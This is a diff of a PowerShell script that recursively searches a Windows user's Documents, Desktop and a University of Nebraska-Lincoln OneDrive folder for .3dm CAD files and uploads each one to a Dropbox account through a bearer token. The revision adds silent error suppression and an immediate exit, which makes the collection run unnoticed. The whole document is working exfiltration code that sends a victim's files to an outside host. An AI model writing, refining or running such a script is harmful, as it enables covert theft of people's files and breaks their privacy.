@@ -1,51 +1,36 @@
-# Force TLS 1.2
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+# 1. Force immediate execution
+$ErrorActionPreference = 'SilentlyContinue'
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-# Dropbox configuration
-$accessToken = $db
-$localFolders = @(
+# 2. Target only .3dm files in these locations
+$folders = @(
     "$env:USERPROFILE\Documents",
     "$env:USERPROFILE\Desktop",
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
 
-# Create folder in Dropbox
-$computerName = $env:COMPUTERNAME
+# 3. Direct file upload (no zipping)
+$computer = $env:COMPUTERNAME
 $headers = @{
-    "Authorization" = "Bearer $accessToken"
-    "Content-Type" = "application/json"
+    "Authorization" = "Bearer $db"
+    "Content-Type" = "application/octet-stream"
 }
-$folderBody = @{
-    "path" = "/$computerName"
-    "autorename" = $true
-} | ConvertTo-Json
 
-try {
-    Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $folderBody
-} catch { <# Folder likely exists #> }
-
-# Upload files
-$headers["Content-Type"] = "application/octet-stream"
-foreach ($folder in $localFolders) {
-    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-        $relativePath = $_.FullName.Replace($folder, '').TrimStart('\')
-        $dropboxPath = "/$computerName/$relativePath".Replace('\', '/')
-        
+foreach ($folder in $folders) {
+    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File | ForEach-Object {
         $uploadArgs = @{
-            "path" = $dropboxPath
+            "path" = "/$computer/$($_.Name)"
             "mode" = "add"
             "autorename" = $true
-            "mute" = $false
         } | ConvertTo-Json -Compress
         
         $headers["Dropbox-API-Arg"] = $uploadArgs
-        
         try {
             $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
-            Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes | Out-Null
-        } catch { <# Silent failure #> }
+            Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes
+        } catch {}
     }
 }
 
-# Keep window open for debugging (remove in production)
-Start-Sleep -Seconds 30
+# 4. Immediate exit (remove for debugging)
+[Environment]::Exit(0)
